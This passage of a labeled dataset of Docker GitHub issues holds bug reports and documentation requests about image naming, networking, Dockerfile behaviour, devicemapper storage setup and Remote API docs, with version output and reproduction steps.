(e.g., when one “tags an image into a repository”)\n\n3 - Repository\n\nIt is not clear if a repository refers to an image name, or an actual image stored in a registry. It is also not clear if the “repository” is the full image name - including the repository host name - or just the name part preceding the colon at the end of the name. It is not clear if the “repository” includes the “namespace”. In fact, the term “namespace” is not mentioned in the spec, but it is clearly an important element of an image name - or is it? (This is not clear.)\n\n4 - Tagging into a repository\n\nThe image spec does not mention this, but the phrase is used in other documentation, without explanation, and it is not clear what this means, especially given the lack of clarity on what “repository” means.\n\n5 - Image \"name\"\n\nThis term is used loosely in the spec and in other documentation - including the various REST APIs, and it is highly ambiguous. Many REST APIs have “name” parameters, and it is not clear if the parameter is a repository name, or can include a final tag (with semicolon) or not - and if it can include a registry host as part of the name. The term “image name” really needs to be precisely defined and used consistently throughout the documentation - especially the REST APIs since those APIs are untyped and thus there is ample opportunity for a programmer to get it wrong.\n"},{"labels":["documentation"],"text":"Tutorial  [Work with a development container](https://docs.docker.com/opensource/project/set-up-dev-env/) talks about the **binary** directory. Current development source makes **binary-client** and **binary-daemon**. This modifies a few steps, like the one where we copy the binary file.\n\nThe documentation can benefit from updates also.\n"},{"labels":["documentation",null],"text":"**Output of `docker version`:**\n\n```\nDocker version 1.11.0, build 4dc5990\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 17\n Running: 16\n Paused: 0\n Stopped: 1\nImages: 182\nServer Version: swarm/1.2.0\nRole: primary\nStrategy: spread\nFilters: health, port, dependency, affinity, constraint\nNodes: 4\n swarm-data: 192.168.99.102:2376\n  └ Status: Healthy\n  └ Containers: 4\n  └ Reserved CPUs: 0 / 1\n  └ Reserved Memory: 0 B / 2.053 GiB\n  └ Labels: executiondriver=, kernelversion=4.1.19-boot2docker, operatingsystem=Boot2Docker 1.11.0 (TCL 7.0); HEAD : 32ee7e9 - Wed Apr 13 20:06:49 UTC 2016, provider=virtualbox, storagedriver=aufs, type=data\n  └ Error: (none)\n  └ UpdatedAt: 2016-04-28T09:06:14Z\n  └ ServerVersion: 1.11.0\n swarm-master: 192.168.99.101:2376\n  └ Status: Healthy\n  └ Containers: 6\n  └ Reserved CPUs: 0 / 1\n  └ Reserved Memory: 0 B / 1.021 GiB\n  └ Labels: executiondriver=, kernelversion=4.1.19-boot2docker, operatingsystem=Boot2Docker 1.11.0 (TCL 7.0); HEAD : 32ee7e9 - Wed Apr 13 20:06:49 UTC 2016, provider=virtualbox, storagedriver=aufs, type=frontend\n  └ Error: (none)\n  └ UpdatedAt: 2016-04-28T09:06:16Z\n  └ ServerVersion: 1.11.0\n swarm-node-01: 192.168.99.103:2376\n  └ Status: Healthy\n  └ Containers: 4\n  └ Reserved CPUs: 0 / 2\n  └ Reserved Memory: 0 B / 5.079 GiB\n  └ Labels: executiondriver=, kernelversion=4.1.19-boot2docker, operatingsystem=Boot2Docker 1.11.0 (TCL 7.0); HEAD : 32ee7e9 - Wed Apr 13 20:06:49 UTC 2016, provider=virtualbox, storagedriver=aufs, type=node\n  └ Error: (none)\n  └ UpdatedAt: 2016-04-28T09:06:35Z\n  └ ServerVersion: 1.11.0\n swarm-node-02: 192.168.99.104:2376\n  └ Status: Healthy\n  └ Containers: 3\n  └ Reserved CPUs: 0 / 2\n  └ Reserved Memory: 0 B / 5.079 GiB\n  └ Labels: executiondriver=, kernelversion=4.1.19-boot2docker, operatingsystem=Boot2Docker 1.11.0 (TCL 7.0); HEAD : 32ee7e9 - Wed Apr 13 20:06:49 UTC 2016, provider=virtualbox, storagedriver=aufs, type=node\n  └ Error: (none)\n  └ UpdatedAt: 2016-04-28T09:06:31Z\n  └ ServerVersion: 1.11.0\nPlugins: \n Volume: \n Network: \nKernel Version: 4.1.19-boot2docker\nOperating System: linux\nArchitecture: amd64\nCPUs: 6\nTotal Memory: 13.23 GiB\nName: a679a60fd15a\nDocker Root Dir: \nDebug mode (client): false\nDebug mode (server): false\nWARNING: No kernel memory limit support\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nI used docker-machine to create a swarm cluster with 4 virtualbox VM.\n\n**Steps to reproduce the issue:**\n1. \n\n```\ndocker network create -d overlay test_lb \n\n# and then in different terminals :\ndocker run --net=test_lb -h first --rm -it debian bash\ndocker run --net=test_lb --net-alias=lb -h second --rm -it debian bash\ndocker run --net=test_lb --net-alias=lb -h third --rm -it debian bash\ndocker run --net=test_lb -h fourth --rm -it debian bash\ndocker run --net=test_lb -h fifth --rm -it debian bash\ndocker run --net=test_lb -h sixth --rm -it debian bash\ndocker run --net=test_lb -h seventh --rm -it debian bash\n```\n\n2.\nThere are now 2 containers with same alias `lb` and 5 containers that are here to use ip slots in the overlay network.\nI personnaly had the following ips assigned by docker in the overlay network:\nfirst : 10.0.0.2\nsecond : 10.0.0.3\nthird : 10.0.0.4\nfourth : 10.0.0.5\nfifth : 10.0.0.6\nsixth : 10.0.0.7\nseventh : 10.0.0.8\n3.\nTry to `ping lb`from the different containers\n\n**Describe the results you received:**\nFrom first, ping always connects to `10.0.0.3` (second)\nFrom second, it always reaches itself\nFrom third, it always reaches itself\nFrom fourth through sixth, it always connects to `10.0.0.4` (third)\nFrom seventh, it connects randomly to  `10.0.0.3` or  `10.0.0.4` \n\n**Describe the results you expected:**\nI expected to always reach randomly  `10.0.0.3` or  `10.0.0.4` \n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nWith this test-case, I think that the cause of the DNS round-robin not working is due to RFC 3484 rule 9 which states that multiple A records are sorted by common prefix length, this breaks the round-robin.\n\nThis explains why seventh (`10.0.0.8`) can reach both containers because the prefix is different.\n\nThe problem is clearly caused by something other than docker but I think it completely voids the purpose of the DNS round-robin from 1.11.\n\nIf anyone can confirm the issue, is there a fix available so that the round-robin can be used in overlay networks?\n"},{"labels":["documentation",null],"text":"PLZ  forgive my poor english\n\nI used Docker Remote API to  Create an image , and post registry value (my private registry dockerregistry:5000 ) to the docker api server  like that \n\n`curl -v  -d \"fromImage=hl%2Fspark&registry=dockerregistry:5000&tag=v1.3\"     --unix-sock   /var/run/docker.sock http:/images/create`\n\nBut  the value of the registry  not worked,  and docker searchs  image from docker hub still .\n\nSo I  had to  use fromImage Query Parameter  like this\n\n`curl -v  -d \"fromImage=dockerregistry:5000/hl%2Fspark&tag=v1.3\"     --unix-sock   /var/run/docker.sock http:/images/create`\n\nand can pull image from my private registry  .\n\nThen l  go to the [https://github.com/docker/docker/blob/master/api/server/router/image/image_routes.go#L76](url) ,  and found the server did not handled Query Parameters registry .\n\nWHY ?\n"},{"labels":["documentation",null,null],"text":"I've tried various combinations of `$PATH` and `%PATH%` and `:` and `;`, but I just can't seem to get `ENV` concatenation to work with Dockerfiles for Windows.\n\nOther people seem to have given up too and just run `RUN setx`: https://github.com/StefanScherer/dockerfiles-windows/blob/197ac3a9a8fe8494915b9b62f517fa67151833cc/golang/Dockerfile#L9\n\n`setx /m` may be the most correct workaround for now.\n\n/cc @jhowardmsft @icecrime @dmp42 \n\n**Output of `docker info`:**\n\n```\ndocker info\nContainers: 71\n Running: 0\n Paused: 0\n Stopped: 71\nImages: 45\nServer Version: 1.11.0-dev\nStorage Driver: windowsfilter\n Windows:\nLogging Driver: json-file\nPlugins:\n Volume: local\n Network: null nat\nKernel Version: 10.0 14316 (14316.1000.amd64fre.rs1_release.160402-2217)\nOperating System: Windows Server 2016 Datacenter Technical Preview 5\nOSType: windows\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 1.242 GiB\nName: WIN-8F5EG07ROBB\nID: VKYM:E5F7:CMIT:4ZMS:OGUG:W43U:API4:ATWI:3S5X:RO54:DU4Q:YOFD\nDocker Root Dir: C:\\ProgramData\\docker\nDebug mode (client): false\nDebug mode (server): true\n File Descriptors: -1\n Goroutines: 24\n System Time: 2016-04-13T18:46:29.3959003-07:00\n EventsListeners: 0\nUsername: friism4test\nRegistry: https://index.docker.io/v1/\n```\n\n**Output of `docker version`:**\n\n```\ndocker version\nClient:\n Version:      1.11.0-rc3\n API version:  1.23\n Go version:   go1.5.3\n Git commit:   eabf97a\n Built:        Fri Apr  1 23:33:49 2016\n OS/Arch:      windows/amd64\n\nServer:\n Version:      1.11.0-dev\n API version:  1.24\n Go version:   go1.5.3\n Git commit:   577adcc\n Built:        Mon Apr 11 17:20:50 2016\n OS/Arch:      windows/amd64\n```\n\n**Steps to reproduce the issue:**\n\n```\n> \"FROM windowsservercore`n RUN echo %PATH%`n ENV PATH c:\\\\go\\\\bin;`$PATH\" | docker build -t test -\nSending build context to Docker daemon 2.048 kB\nStep 1 : FROM windowsservercore\n ---> e1e5fb4dbc32\nStep 2 : RUN echo %PATH%\n ---> Running in 91a3c7417bc3\nC:\\Windows\\system32;C:\\Windows;%localappdata%\\Microsoft\\WindowsApps;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\\n ---> 818d81426779\nRemoving intermediate container 91a3c7417bc3\nStep 3 : ENV PATH c:\\\\go\\\\bin;$PATH\n ---> Running in f6ab92ac3110\n ---> d6b86fdef7e5\nRemoving intermediate container f6ab92ac3110\nSuccessfully built d6b86fdef7e5\n> docker run test cmd /c echo %PATH%\nc:\\go\\bin;\n```\n\n**Describe the results you received:**\n\nIncorrect PATH\n\n**Describe the results you expected:**\n\nCorrectly concatenated PATH\n"},{"labels":["documentation",null],"text":"The image spec at https://github.com/docker/docker/blob/3d13fddd2bc4d679f0eaa68b0be877e5a816ad53/image/spec/v1.md hasn't been updated for the content addressability changes that went into Docker 1.10. This spec also seems to contain some outdated fields like \"image checksum\". It shouldn't be very hard to bring this up to date. The changes in 1.10 are described in https://gist.github.com/aaronlehmann/b42a2eaf633fc949f93b#new-image-config.\n\ncc @stevvooe @tonistiigi @dmcgowan \n"},{"labels":["documentation",null],"text":"The JSON for the  [`containers/create`](https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.22.md#create-a-container) endpoint  is missing `NetworkConfig`. API versions 1.22, 1.23 and 1.24 need to be updated to contain this in the example JSON.\n\n/cc @aboch @mavenugo @dnephin  \n"},{"labels":["documentation",null],"text":"On the [official networking documentation page](https://docs.docker.com/engine/userguide/networking/default_network/container-communication/), there's a paragraph that addresses using iptables to restrict access to containers by IP:\n\n> Docker’s forward rules permit all external source IPs by default. To allow only a specific IP or network to access the containers, insert a negated rule at the top of the DOCKER filter chain. For example, to restrict external access such that only source IP 8.8.8.8 can access the containers, the following rule could be added:\n> \n> `$ iptables -I DOCKER -i ext_if ! -s 8.8.8.8 -j DROP`\n\nThis may have been true for older versions of Engine but I can't get this to work in 1.10.3. The rule is applied as advertised, it comes first in iptables -L DOCKER, but the containers are still reachable from the whole outside world. If the docs could be upgraded for the current version of Docker, that'd be very helpful. Thanks!\n"},{"labels":["documentation",null],"text":"It may just be a problem on my machine, but it seems that creating a container that sits on two networks is somehow interfering with port forwarding. The forwarding works when accessing 127.0.01, but not when accessing the IP address for another interface.\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.10.3\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   20f81dd\n Built:        Thu Mar 10 15:54:52 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.10.3\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   20f81dd\n Built:        Thu Mar 10 15:54:52 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 2\n Running: 2\n Paused: 0\n Stopped: 0\nImages: 68\nServer Version: 1.10.3\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 304\n Dirperm1 Supported: false\nExecution Driver: native-0.2\nLogging Driver: json-file\nPlugins: \n Volume: local\n Network: bridge null host\nKernel Version: 3.13.0-83-generic\nOperating System: Ubuntu 14.04.4 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 31.36 GiB\nName: kryton\nID: MFLN:XRFL:372N:VPKR:3AWK:USXB:3Q3E:EAH2:66ZK:T5U2:NEOP:TSCH\nUsername: bmerry\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\nPhysical machine\n\n**Steps to reproduce the issue:**\n1. Create a `docker-compose.yml` file with the following content\n\n```\nversion: \"2\"\nservices:\n    server:\n        image: nginx:1.9.12\n        networks:\n            - front\n            - back\n        ports:\n            - \"8080:80\"\nnetworks:\n    front:\n    back:\n```\n\nIn actual use, there would be other services connect to the `back` network but not the `front` network, but they're not necessary to demonstrate the bug.\n2. With docker-compose 1.6.2, run `docker-compose up`.\n3. From the host, run `curl http://localhost:8080`.\n4. From the host, run `curl http://IPADDRESS:8080`, where IPADDRESS is an IP address of a non-local interface on the machine.\n\n**Describe the results you received:**\nStep 3 spits out an HTML page from nginx. Step 4 outputs nothing and eventually times out.\n\n**Describe the results you expected:**\nStep 4 should return the same HTML page as step 3.\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nI'm not running any other firewall software on this machine. If I remove the config line putting the service on the `back` network, then the problem disappears. Similarly, if I run `docker network disconnect` to disconnect the container from the `back` network, the problem disappears, and reconnecting it makes the problem come back.\n\n**Output of iptables -vnL**:\n\n```\nChain INPUT (policy ACCEPT 4912 packets, 2311K bytes)\n pkts bytes target     prot opt in     out     source               destination         \n\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 DOCKER-ISOLATION  all  --  *      *       0.0.0.0/0            0.0.0.0/0           \n    0     0 DOCKER     all  --  *      br-b81344fadd68  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  *      br-b81344fadd68  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED\n    0     0 ACCEPT     all  --  br-b81344fadd68 !br-b81344fadd68  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  br-b81344fadd68 br-b81344fadd68  0.0.0.0/0            0.0.0.0/0           \n    0     0 DOCKER     all  --  *      br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  *      br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED\n    0     0 ACCEPT     all  --  br-a4d09867c7ea !br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  br-a4d09867c7ea br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0           \n    0     0 DOCKER     all  --  *      docker0  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  *      docker0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED\n    0     0 ACCEPT     all  --  docker0 !docker0  0.0.0.0/0            0.0.0.0/0           \n    0     0 ACCEPT     all  --  docker0 docker0  0.0.0.0/0            0.0.0.0/0           \n\nChain OUTPUT (policy ACCEPT 4538 packets, 674K bytes)\n pkts bytes target     prot opt in     out     source               destination         \n\nChain DOCKER (3 references)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 ACCEPT     tcp  --  !docker0 docker0  0.0.0.0/0            172.17.0.2           tcp dpt:5000\n    0     0 ACCEPT     tcp  --  !br-a4d09867c7ea br-a4d09867c7ea  0.0.0.0/0            172.18.0.2           tcp dpt:80\n\nChain DOCKER-ISOLATION (1 references)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 DROP       all  --  br-a4d09867c7ea br-b81344fadd68  0.0.0.0/0            0.0.0.0/0           \n    0     0 DROP       all  --  br-b81344fadd68 br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0           \n    0     0 DROP       all  --  docker0 br-b81344fadd68  0.0.0.0/0            0.0.0.0/0           \n    0     0 DROP       all  --  br-b81344fadd68 docker0  0.0.0.0/0            0.0.0.0/0           \n    0     0 DROP       all  --  docker0 br-a4d09867c7ea  0.0.0.0/0            0.0.0.0/0           \n    0     0 DROP       all  --  br-a4d09867c7ea docker0  0.0.0.0/0            0.0.0.0/0           \n    0     0 RETURN     all  --  *      *       0.0.0.0/0            0.0.0.0/0           \n```\n\n**Output of iptables -t nat -vnL**\n\n```\nhain PREROUTING (policy ACCEPT 8 packets, 536 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 DOCKER     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ADDRTYPE match dst-type LOCAL\n\nChain INPUT (policy ACCEPT 2 packets, 272 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n\nChain OUTPUT (policy ACCEPT 528 packets, 34127 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n    1    60 DOCKER     all  --  *      *       0.0.0.0/0           !127.0.0.0/8          ADDRTYPE match dst-type LOCAL\n\nChain POSTROUTING (policy ACCEPT 529 packets, 34187 bytes)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 MASQUERADE  all  --  *      !br-b81344fadd68  172.19.0.0/16        0.0.0.0/0           \n    0     0 MASQUERADE  all  --  *      !br-a4d09867c7ea  172.18.0.0/16        0.0.0.0/0           \n    0     0 MASQUERADE  all  --  *      !docker0  172.17.0.0/16        0.0.0.0/0           \n    0     0 MASQUERADE  tcp  --  *      *       172.17.0.2           172.17.0.2           tcp dpt:5000\n    0     0 MASQUERADE  tcp  --  *      *       172.18.0.2           172.18.0.2           tcp dpt:80\n\nChain DOCKER (2 references)\n pkts bytes target     prot opt in     out     source               destination         \n    0     0 RETURN     all  --  br-b81344fadd68 *       0.0.0.0/0            0.0.0.0/0           \n    0     0 RETURN     all  --  br-a4d09867c7ea *       0.0.0.0/0            0.0.0.0/0           \n    0     0 RETURN     all  --  docker0 *       0.0.0.0/0            0.0.0.0/0           \n    0     0 DNAT       tcp  --  !docker0 *       0.0.0.0/0            0.0.0.0/0            tcp dpt:5000 to:172.17.0.2:5000\n    1    60 DNAT       tcp  --  !br-a4d09867c7ea *       0.0.0.0/0            0.0.0.0/0            tcp dpt:8080 to:172.18.0.2:80\n```\n"},{"labels":["documentation",null,null],"text":"docker build and Dockerfile does not respect VOLUME if COPY or ADD move in multiple files or a whole directory.  If a single file is specified in either COPY or ADD it works as expected.  The file is available during the build and then not present in the image.\n\n---\n## BUG REPORT INFORMATION\n\n**Output of `docker version`:**\n\n```\n\nClient:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.3\n Git commit:   a34a1d5\n Built:        Fri Nov 20 17:56:04 UTC 2015\n OS/Arch:      darwin/amd64\n\nServer:\n Version:      1.10.0\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   590d5108\n Built:        2016-02-04T19:55:25.696148927+00:00\n OS/Arch:      linux/amd64\n\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 2\nImages: 5\nServer Version: 1.10.0\nStorage Driver: btrfs\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.3.3-dhyve\nOperating System: Buildroot 2015.11.1\nCPUs: 1\nTotal Memory: 3.86 GiB\nName: dlite\nID: MZRL:W4WC:2JDK:Z2JS:F5KM:UGUT:VFJV:ZO7M:ATVR:66HH:CS4L:5PXL\n```\n\ndlite 1.4.0\nOSx 10.11.4\n\n**Steps to reproduce the issue:**\n0. make a dir \"sample\" with a text file \"textfile.txt\" with some contents\n1. Dockerfile using an OS base and with contents\nVOLUME /opt/sample\nCOPY sample/ /opt/sample\n2. docker build volume_sample\n3. docker run -it volume_sample bash\n4. cat /opt/sample/textfile.txt\n\n**Describe the results you received:**\nthe contents of textfile.txt are output\n\n**Describe the results you expected:**\nan error of \"No such file or directory\"\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation"],"text":"The current documentation for setting up devicemapper is out of date. The current suggested configuration using  `dm.datadev` and `dm.metadatadev`, er the man page `man docker daemon`, are deprecated and using `dm.thinpooldev` is now the preferred method.  We should update the documentation with new best practices/starting points.\nhttps://docs.docker.com/engine/userguide/storagedriver/device-mapper-driver/#configure-direct-lvm-mode-for-production\n\nI wouldn't claim to be a LVM or devicemapper expert but I put together an example set of steps based off of `docker-storage-setup` and some other defaults that work well from my experimenting:\n\n```\n# install lvm2\nyum install lvm2\n\n# ideally, perform these tasks before you start docker for the first time OR make sure docker is stopped; all containers, images and data will be lost during this process\n\n# create a physical volume (replace /dev/sdd with your block device)\npvcreate /dev/sdd\n\n# create a volume group named 'docker' (replace /dev/sdd with your block device)\nvgcreate docker /dev/sdd\n\n# create a thin pool named 'thinpool'; in this example, the data LV is 95% of the 'docker' volume group size (leaving free space allows for auto expanding of either the data or metadata if space is runs low as a temporary stopgap)\nlvcreate --wipesignatures y -n thinpool docker -l 95%VG\nlvcreate --wipesignatures y -n thinpoolmeta docker -l 1%VG\n\n# convert the pool to a thin-pool\nlvconvert -y --zero n -c 512K --thinpool docker/thinpool --poolmetadata docker/thinpoolmeta\n\n#  configure autoextension of thin pools via a lvm profile\nvi /etc/lvm/profile/docker-thinpool.profile\n\n# specify the value for 'thin_pool_autoextend_threshold' (where the number is the % of space used before lvm attempts to autoextend the available space; 100 = disabled)\nexample:\n    thin_pool_autoextend_threshold = 80\n\n# modify the autoextend percentage for when thin pool autoextension occurs (where the number is the % of space to increase the thin pool; 100 = disabled)\nexample:\n    thin_pool_autoextend_percent = 20\n\nexample /etc/lvm/profile/docker-thinpool.profile:\nactivation {\n    thin_pool_autoextend_threshold=80\n    thin_pool_autoextend_percent=20\n}\n\n# apply the lvm profile\nlvchange --metadataprofile docker-thinpool docker/thinpool\n\n# verified the lv is monitored\nlvs -o+seg_monitor\n\n# configure docker daemon with specific devicemapper options\n--storage-driver=devicemapper --storage-opt=dm.thinpooldev=/dev/mapper/docker-thinpool --storage-opt dm.use_deferred_removal=true\n    also see `man docker daemon` for more detail on the devicemapper options used.\n\nexample daemon.json:\n{\n        \"storage-driver\": \"devicemapper\",\n        \"storage-opts\": [\n                \"dm.thinpooldev=/dev/mapper/docker-thinpool\",\n                \"dm.use_deferred_removal=true\"\n        ]\n}\n\n# if docker was previously started, clear your graph driver directory\nrm -rf /var/lib/docker/*\n\n# start docker\nsystemctl start docker\n\n# make sure to monitor your thin pool and volume group free space!  it will auto-extend but the volume group can still fill up\n# monitor logical volumes\nlvs\nlvs -a (to see the data and metadata sizes)\n\n# monitor volume group free space\nvgs\n\n# logs can show the auto-extension of the thin pool when it hits the threshold\njournalctl -fu dm-event.service\n```\n\nIt would probably also make sense to add reference about https://github.com/docker/docker/pull/20786 which will be in 1.11 as that is important, especially for a production environment.  It has a sane default but can be easily configured to meet requirements in another environment.\n"},{"labels":["documentation"],"text":"For integration and acceptance testing I want access to data from the container. I would like to use `volumes` in docker-compose file to specify the relative host path. In many occasions the host path of the volume may need to be auto-created.\n\n**Problem**\n\nAuto-creation of the host path in a volume appears to be DEPRECATED, as stated in documentation [here](https://docs.docker.com/engine/userguide/containers/dockervolumes/#auto-creating-missing-host-paths-for-bind-mounts):\n\n> The directory on the host must be specified as an absolute path and if the directory doesn’t exist Docker will automatically create it for you. This auto-creation of the host path has been deprecated.\n\nThe documentation does not explain what will be the future behaviour. Will we get an error, or will the volume just not mount? Is there an additional flag to get auto-creation back, etc?\n\n**Desired outcome**\n- Describe the new behaviour in more detail. What should we use?\n- Update the documentation page at https://docs.docker.com/engine/userguide/containers/dockervolumes/ accordingly\n\nThanks!\n"},{"labels":["documentation",null],"text":"**Output of `docker version`:**\n\n```\nClient version: 1.7.1\nClient API version: 1.19\nGo version (client): go1.6\nGit commit (client): 786b29d\nOS/Arch (client): darwin/amd64\nServer version: 1.10.3\nServer API version: 1.22\nGo version (server): go1.5.3\nGit commit (server): 20f81dd\nOS/Arch (server): linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 6\nImages: 1\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 14\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.1.19-boot2docker\nOperating System: Boot2Docker 1.10.3 (TCL 6.4.1); master : 625117e - Thu Mar 10 22:09:02 UTC 2016\nCPUs: 2\nTotal Memory: 1.955 GiB\nName: 1.10.3-vmware\nID: NYFA:XWPO:HDL2:SDNL:LWHQ:WPS2:SU2X:IHRA:K5F3:5XJ2:RGZJ:HWTK\nDebug mode (server): true\nFile Descriptors: 25\nGoroutines: 38\nSystem Time: 2016-03-29T19:59:33.113353448Z\nEventsListeners: 0\nInit SHA1:\nInit Path: /usr/local/bin/docker\nDocker Root Dir: /mnt/sda1/var/lib/docker\nUsername: dxia\nRegistry: https://index.docker.io/v1/\nLabels:\n provider=vmwarefusion\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n1. do a docker exec create\n2. do docker exec start\n3. docker exec inspect\n\n```\ncurl --insecure --cert ~/.docker/machine/machines/1.10.3-vmware/b2d-client-side.p12 --pass tcuser 'https://192.168.212.133:2376/exec/f33bbfb39f5b142420f4759b2348913bd4a8d1a6d7fd56499cb41a1bb91d7b3b/json' -vvv\n\n*   Trying 192.168.212.133...\n* Connected to 192.168.212.133 (192.168.212.133) port 2376 (#0)\n* WARNING: SSL: Certificate type not set, assuming PKCS#12 format.\n* Client certificate: dxia\n* TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\n* Server certificate: dxia.1.10.3-vmware\n* Server certificate: dxia\n> GET /exec/f33bbfb39f5b142420f4759b2348913bd4a8d1a6d7fd56499cb41a1bb91d7b3b/json HTTP/1.1\n> Host: 192.168.212.133:2376\n> User-Agent: curl/7.43.0\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/json\n< Server: Docker/1.10.3 (linux)\n< Date: Tue, 29 Mar 2016 19:47:24 GMT\n< Content-Length: 379\n<\n{\"ID\":\"f33bbfb39f5b142420f4759b2348913bd4a8d1a6d7fd56499cb41a1bb91d7b3b\",\"Running\":false,\"ExitCode\":2,\"ProcessConfig\":{\"tty\":true,\"entrypoint\":\"sh\",\"arguments\":[\"-c\",\"exit 2\"],\"privileged\":false,\"user\":\"1000\"},\"OpenStdin\":true,\"OpenStderr\":true,\"OpenStdout\":true,\"CanRemove\":false,\"ContainerID\":\"b53ee82b53a40c7dca428523e34f741f3abc51d9f297a14ff874bf761b995126\",\"DetachKeys\":\"\"}\n```\n\n**Describe the results you received:**\nThere's only a `ContainerID` instead of the entire `Container` object as stated in the docs here https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.22.md#exec-inspect.\n\n**Describe the results you expected:**\nThe docs should correspond to the behavior.\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":[null,"documentation"],"text":"Every part of the remote API that returns a collection of objects (`GET /images/json`, `GET /containers/json`, `GET /events`, etc.) returns its values as a JSON list of objects: `[{...}, {...}, ...]`. Every part, that is, except `GET /volumes`. That endpoint returns an object of one element whose value is a list: `{ \"Volumes\": [{...}, {...}, ...] }`. This is still the case in the [most recent dev Remote API Docs](https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.24.md#list-volumes).\n\nIs there a reason `GET /volumes` is inconsistent with the rest of the API? If there is no reason, I ask that it be made to return a flat list.\n"},{"labels":["documentation"],"text":"Just like https://docs.docker.com/compose/completion/, it would be useful to have https://docs.docker.com/engine/completion/\n\nThis is already answered at:\n\nhttp://stackoverflow.com/questions/26132451/how-to-add-bash-command-completion-for-docker-on-mac-os-x\n"},{"labels":["documentation"],"text":"Broken links at: https://docs.docker.com/docker-hub/overview/\n\nWebhooks link to https://docs.docker.com/docker-hub/builds/#webhooks instead of https://docs.docker.com/docker-hub/webhooks/.\n"},{"labels":["documentation",null,null],"text":"Loving the new seccomp BPF stuff; thanks for making it more \"within reach\" for typical users.\n\n[I wrote a little thing to allow ptrace in my containers](https://blog.afoolishmanifesto.com/posts/how-to-enable-ptrace-in-docker-1.10/) and while it worked I started getting these warnings:\n\n```\n2016/03/21 22:05:18 Error resolving syscall name copy_file_range: could not resolve name to syscall - ignoring syscall.\n2016/03/21 22:05:18 Error resolving syscall name mlock2: could not resolve name to syscall - ignoring syscall.\n```\n\nNot a huge deal, but I figured out I would go ahead and automate the exclusion of system calls that are \"unknown.\"  After scripting that there were five other system calls that were excluded:\n1. recv - this is, as far as I understand the exact same as recvfrom, seems safe to leave out\n2. send - same as recv, but sendto\n3. cacheflush - this is for a non-x86 arch (MIPS) which I'd be surprised if Go even worked on, but either way also seems safe (for me, but maybe not docker proper) to leave out\n4. breakpoint - I have no manpage for this; perhaps it is the same as 3 but undocumented?\n5. set_tls - same situation as 4.\n\nHonestly I am not super sure where to go from here.  Some documentation on why all of these are included might be nice.  The weirder thing to me was that I got a warning for mlock2 and copy_file_range but not cacheflush, breakpoint, and set_tls.\n\nSorry to have such a vague report, but I figured more information can't hurt.\n"},{"labels":["documentation"],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.10.3\n API version:  1.22\n Go version:   go1.6\n Git commit:   20f81dd\n Built:        Sat Mar 12 04:07:44 UTC 2016\n OS/Arch:      darwin/amd64\n\nServer:\n Version:      